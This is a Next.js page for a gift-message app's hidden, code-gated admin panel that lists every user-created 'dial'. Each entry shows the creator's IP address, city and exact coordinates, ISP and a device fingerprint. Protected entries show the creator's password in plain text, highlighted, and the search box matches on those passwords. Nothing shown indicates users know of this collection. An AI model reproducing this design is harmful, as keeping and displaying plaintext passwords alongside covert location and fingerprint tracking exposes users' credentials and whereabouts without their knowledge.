'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

/* ─────────── Gate Screen ─────────── */
function GateScreen({ onVerified }) {
  const [secret, setSecret] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [shake, setShake] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const res = await fetch('/api/aulia/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ secret }),
      });
      const data = await res.json();

      if (!res.ok) {
        setShake(true);
        setTimeout(() => setShake(false), 600);
        setError('Wrong code. Try again.');
        return;
      }

      sessionStorage.setItem('aulia_token', data.token);
      onVerified(data.token);
    } catch {
      setError('Something went wrong.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: '100vh', background: 'var(--blush)',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      padding: 24,
    }}>
      <div className="card" style={{
        maxWidth: 400, width: '100%', textAlign: 'center',
        animation: shake ? 'shakeX 0.5s' : 'none',
      }}>
        <div style={{ fontSize: '3rem', marginBottom: 16 }}>🔐</div>
        <h1 style={{ fontWeight: 900, fontSize: '1.5rem', marginBottom: 8, color: 'var(--plum)' }}>
          Restricted Area
        </h1>
        <p style={{ color: 'var(--grey)', marginBottom: 24, fontSize: '0.92rem' }}>
          Enter the secret code to continue
        </p>

        <form onSubmit={handleSubmit}>
          <input
            type="password"
            value={secret}
            onChange={e => setSecret(e.target.value)}
            placeholder="Secret code…"
            autoFocus
            style={{
              width: '100%', border: `2px solid ${error ? 'var(--coral)' : 'var(--card-pink)'}`,
              borderRadius: 14, padding: '12px 18px',
              fontFamily: 'Nunito', fontSize: '1rem', outline: 'none',
              background: 'rgba(255,107,157,0.03)', textAlign: 'center',
              letterSpacing: 4, fontWeight: 700, color: 'var(--plum)',
              transition: 'border-color 0.3s',
            }}
            onFocus={e => { if (!error) e.target.style.borderColor = 'var(--pink)'; }}
            onBlur={e => { if (!error) e.target.style.borderColor = 'var(--card-pink)'; }}
          />
          {error && (
            <p style={{ color: 'var(--coral)', fontWeight: 700, fontSize: '0.85rem', marginTop: 10 }}>
              {error}
            </p>
          )}
          <button
            type="submit"
            className="btn-primary"
            disabled={loading || !secret}
            style={{ width: '100%', marginTop: 20 }}
          >
            {loading ? '⏳ Verifying…' : '🔓 Enter'}
          </button>
        </form>
      </div>

      <style jsx>{`
        @keyframes shakeX {
          0%, 100% { transform: translateX(0); }
          20% { transform: translateX(-12px); }
          40% { transform: translateX(10px); }
          60% { transform: translateX(-8px); }
          80% { transform: translateX(6px); }
        }
      `}</style>
    </div>
  );
}

/* ─────────── Metadata Grid (reusable) ─────────── */
function MetaGrid({ rows }) {
  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px 16px', fontSize: '0.82rem' }}>
      {rows.map(row => (
        <div key={row.label} style={{ marginBottom: 4 }}>
          <div style={{ fontWeight: 700, color: 'var(--grey)', marginBottom: 2 }}>{row.label}</div>
          <div style={{
            color: 'var(--plum)', fontWeight: 600,
            wordBreak: 'break-all',
            fontFamily: row.mono ? 'monospace' : 'inherit',
            background: row.highlight ? 'rgba(199,125,255,0.1)' : 'transparent',
            padding: row.highlight ? '2px 8px' : 0,
            borderRadius: 6,
          }}>
            {String(row.val)}
          </div>
        </div>
      ))}
    </div>
  );
}

/* ─────────── Dial Card ─────────── */
function DialCard({ dial }) {
  const [expanded, setExpanded] = useState(false);

  const created = new Date(dial.createdAt).toLocaleString();
  const expires = new Date(dial.expiresAt).toLocaleString();

  return (
    <div className="card" style={{
      marginBottom: 20,
      border: dial.isExpired ? '2px solid rgba(255,107,107,0.3)' : '2px solid var(--card-pink)',
      opacity: dial.isExpired ? 0.7 : 1,
      transition: 'all 0.3s',
    }}>
      {/* Header */}
      <div style={{
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        marginBottom: 16, flexWrap: 'wrap', gap: 8,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{
            fontWeight: 900, fontSize: '1.1rem', color: 'var(--plum)',
            fontFamily: 'monospace',
          }}>#{dial.dialId}</span>
          <span style={{
            background: dial.isExpired
              ? 'rgba(255,107,107,0.15)' : 'rgba(107,203,119,0.15)',
            color: dial.isExpired ? 'var(--coral)' : 'var(--green)',
            padding: '3px 10px', borderRadius: 50, fontSize: '0.75rem', fontWeight: 800,
          }}>
            {dial.isExpired ? '⛔ Expired' : `✅ Active · ${dial.daysLeft}d left`}
          </span>
          {dial.isProtected && (
            <span style={{
              background: 'rgba(199,125,255,0.15)', color: 'var(--lavender)',
              padding: '3px 10px', borderRadius: 50, fontSize: '0.75rem', fontWeight: 800,
            }}>🔒 Protected</span>
          )}
        </div>
        <button
          onClick={() => setExpanded(!expanded)}
          style={{
            background: 'rgba(255,107,157,0.1)', border: 'none', borderRadius: 10,
            padding: '6px 14px', cursor: 'pointer', fontFamily: 'Nunito',
            fontWeight: 700, fontSize: '0.82rem', color: 'var(--pink)',
          }}
        >{expanded ? '▲ Collapse' : '▼ Expand'}</button>
      </div>

      {/* Stats Row */}
      <div style={{
        display: 'flex', gap: 12, marginBottom: 16, flexWrap: 'wrap',
      }}>
        {[
          { icon: '👀', label: 'Views', val: dial.viewCount ?? 0 },
          { icon: '💖', label: 'Reactions', val: dial.reactions ?? 0 },
          { icon: '📅', label: 'Created', val: created },
          { icon: '⏰', label: 'Expires', val: expires },
        ].map(s => (
          <div key={s.label} style={{
            background: 'rgba(255,107,157,0.06)', borderRadius: 10,
            padding: '6px 12px', fontSize: '0.78rem', fontWeight: 600,
            color: 'var(--grey)',
          }}>
            {s.icon} <strong style={{ color: 'var(--plum)' }}>{s.val}</strong> {s.label === 'Created' || s.label === 'Expires' ? '' : s.label}
          </div>
        ))}
      </div>

      {/* Photos */}
      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
        {dial.photoUrls?.map((url, i) => (
          <a key={i} href={url} target="_blank" rel="noopener noreferrer">
            <img src={url} alt={`Photo ${i + 1}`} style={{
              width: 60, height: 60, borderRadius: 10, objectFit: 'cover',
              border: '2px solid var(--card-pink)', cursor: 'pointer',
              transition: 'transform 0.2s',
            }}
              onMouseEnter={e => e.target.style.transform = 'scale(1.1)'}
              onMouseLeave={e => e.target.style.transform = 'scale(1)'}
            />
          </a>
        ))}
      </div>

      {/* Audio */}
      {dial.audioUrl && (
        <audio controls src={dial.audioUrl} style={{
          width: '100%', marginBottom: 12, borderRadius: 8,
        }} />
      )}

      {/* Note */}
      {dial.message && (
        <div style={{
          background: 'rgba(255,107,157,0.04)', border: '1px solid var(--card-pink)',
          borderRadius: 12, padding: '10px 14px', marginBottom: 12,
          fontStyle: 'italic', color: 'var(--plum)', fontSize: '0.9rem',
          lineHeight: 1.6,
        }}>
          💌 "{dial.message}"
        </div>
      )}

      {/* Expanded: all metadata */}
      {expanded && (
        <div style={{
          background: 'rgba(61,44,62,0.04)', borderRadius: 12,
          padding: 16, marginTop: 8,
        }}>
          {/* Network & Security */}
          <h4 style={{ fontWeight: 800, fontSize: '0.85rem', color: 'var(--plum)', marginBottom: 10 }}>
            🌐 Network & Security
          </h4>
          <MetaGrid rows={[
            { label: 'IP Address', val: dial.creatorIp || '—', mono: true },
            { label: '🔑 Password', val: dial.passwordPlain || (dial.passwordHash ? `[hash: ${dial.passwordHash.slice(0, 20)}…]` : 'None'), mono: true, highlight: !!dial.passwordPlain },
            { label: '📍 Location', val: dial.geoLocation ? `${dial.geoLocation.city}, ${dial.geoLocation.region}, ${dial.geoLocation.country}` : '—' },
            { label: '🏢 ISP', val: dial.geoLocation?.isp || '—' },
            { label: '📌 Coordinates', val: dial.geoLocation ? `${dial.geoLocation.lat}, ${dial.geoLocation.lng}` : '—', mono: true },
          ]} />

          {/* Device Fingerprint */}
          {dial.clientFingerprint && (
            <>
              <h4 style={{ fontWeight: 800, fontSize: '0.85rem', color: 'var(--plum)', marginBottom: 10, marginTop: 16 }}>
                🖥️ Device Fingerprint
              </h4>
              <MetaGrid rows={[
                { label: '🕐 Timezone', val: dial.clientFingerprint.tz || '—' },
                { label: '📐 Screen', val: dial.clientFingerprint.sr || '—' },
                { label: '🔲 Pixel Ratio', val: dial.clientFingerprint.dp ?? '—' },
                { label: '💻 Platform', val: dial.clientFingerprint.pl || '—' },
                { label: '👆 Touch Points', val: dial.clientFingerprint.tp ?? '—' },
                { label: '⚙️ CPU Cores', val: dial.clientFingerprint.cc ?? '—' },
                { label: '🧠 Memory', val: dial.clientFingerprint.dm ? `${dial.clientFingerprint.dm} GB` : '—' },
                { label: '📶 Connection', val: dial.clientFingerprint.ct || '—' },
                { label: '🌐 Online', val: dial.clientFingerprint.ol === true ? 'Yes' : dial.clientFingerprint.ol === false ? 'No' : '—' },
              ]} />
            </>
          )}

          {/* Request Context */}
          <h4 style={{ fontWeight: 800, fontSize: '0.85rem', color: 'var(--plum)', marginBottom: 10, marginTop: 16 }}>
            🔗 Request Context
          </h4>
          <MetaGrid rows={[
            { label: 'User Agent', val: dial.creatorUserAgent || '—' },
            { label: 'Referrer', val: dial.creatorReferer || '—' },
            { label: 'Language', val: dial.creatorLanguage || '—' },
            { label: 'Photos Count', val: `${dial.photoUrls?.length ?? 0}` },
          ]} />
        </div>
      )}
    </div>
  );
}

/* ─────────── Dashboard ─────────── */
function Dashboard({ token }) {
  const [dials, setDials] = useState([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const router = useRouter();

  useEffect(() => {
    const fetchDials = async () => {
      try {
        const res = await fetch('/api/aulia/dials', {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (res.status === 401) {
          sessionStorage.removeItem('aulia_token');
          router.push('/');
          return;
        }
        const data = await res.json();
        setDials(data.dials || []);
        setTotal(data.total || 0);
      } catch {
        setError('Failed to load dials.');
      } finally {
        setLoading(false);
      }
    };
    fetchDials();
  }, [token, router]);

  const filtered = dials.filter(d =>
    d.dialId?.toLowerCase().includes(search.toLowerCase()) ||
    d.message?.toLowerCase().includes(search.toLowerCase()) ||
    d.creatorIp?.includes(search) ||
    d.passwordPlain?.toLowerCase().includes(search.toLowerCase())
  );

  const activeCount = dials.filter(d => !d.isExpired).length;
  const protectedCount = dials.filter(d => d.isProtected).length;

  const handleLogout = () => {
    sessionStorage.removeItem('aulia_token');
    router.push('/');
  };

  return (
    <div style={{
      minHeight: '100vh', background: 'var(--blush)',
      padding: '24px',
    }}>
      {/* Header */}
      <div style={{
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        marginBottom: 24, flexWrap: 'wrap', gap: 12,
      }}>
        <div>
          <h1 style={{ fontWeight: 900, fontSize: '1.8rem', color: 'var(--plum)', margin: 0 }}>
            🛡️ Admin Panel
          </h1>
          <p style={{ color: 'var(--grey)', fontSize: '0.85rem', marginTop: 4 }}>
            All dials in the database
          </p>
        </div>
        <button onClick={handleLogout} style={{
          background: 'rgba(255,107,107,0.1)', border: '2px solid rgba(255,107,107,0.3)',
          borderRadius: 12, padding: '8px 18px', cursor: 'pointer',
          fontFamily: 'Nunito', fontWeight: 700, color: 'var(--coral)',
          fontSize: '0.85rem',
        }}>🚪 Logout</button>
      </div>

      {/* Stats Summary */}
      <div style={{
        display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))',
        gap: 12, marginBottom: 24,
      }}>
        {[
          { icon: '📊', label: 'Total Dials', val: total, bg: 'var(--card-pink)' },
          { icon: '✅', label: 'Active', val: activeCount, bg: 'var(--card-green)' },
          { icon: '⛔', label: 'Expired', val: total - activeCount, bg: 'rgba(255,107,107,0.12)' },
          { icon: '🔒', label: 'Protected', val: protectedCount, bg: 'var(--card-lav)' },
        ].map(s => (
          <div key={s.label} style={{
            background: s.bg, borderRadius: 16, padding: '16px 14px',
            textAlign: 'center',
          }}>
            <div style={{ fontSize: '1.5rem' }}>{s.icon}</div>
            <div style={{ fontWeight: 900, fontSize: '1.4rem', color: 'var(--plum)' }}>{s.val}</div>
            <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--grey)' }}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* Search */}
      <input
        type="text"
        value={search}
        onChange={e => setSearch(e.target.value)}
        placeholder="🔍 Search by ID, message, IP, or password…"
        style={{
          width: '100%', border: '2px solid var(--card-pink)',
          borderRadius: 14, padding: '12px 18px', marginBottom: 20,
          fontFamily: 'Nunito', fontSize: '0.95rem', outline: 'none',
          background: 'white', color: 'var(--plum)',
        }}
        onFocus={e => e.target.style.borderColor = 'var(--pink)'}
        onBlur={e => e.target.style.borderColor = 'var(--card-pink)'}
      />

      {/* Content */}
      {loading ? (
        <div style={{ textAlign: 'center', padding: 60, color: 'var(--grey)' }}>
          <div style={{ fontSize: '2rem', marginBottom: 12 }}>⏳</div>
          <p style={{ fontWeight: 700 }}>Loading dials…</p>
        </div>
      ) : error ? (
        <div style={{ textAlign: 'center', padding: 60, color: 'var(--coral)' }}>
          <p style={{ fontWeight: 700 }}>{error}</p>
        </div>
      ) : filtered.length === 0 ? (
        <div style={{ textAlign: 'center', padding: 60, color: 'var(--grey)' }}>
          <div style={{ fontSize: '2rem', marginBottom: 12 }}>🫙</div>
          <p style={{ fontWeight: 700 }}>{search ? 'No matches found' : 'No dials yet'}</p>
        </div>
      ) : (
        <>
          <p style={{ color: 'var(--grey)', fontSize: '0.82rem', marginBottom: 12, fontWeight: 600 }}>
            Showing {filtered.length} of {total} dial(s)
          </p>
          {filtered.map(dial => (
            <DialCard key={dial._id} dial={dial} />
          ))}
        </>
      )}
    </div>
  );
}

/* ─────────── Main Page ─────────── */
export default function AuliaPage() {
  const [token, setToken] = useState(null);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    const saved = sessionStorage.getItem('aulia_token');
    if (saved) setToken(saved);
    setChecking(false);
  }, []);

  if (checking) return null;

  if (!token) return <GateScreen onVerified={setToken} />;

  return <Dashboard token={token} />;
}
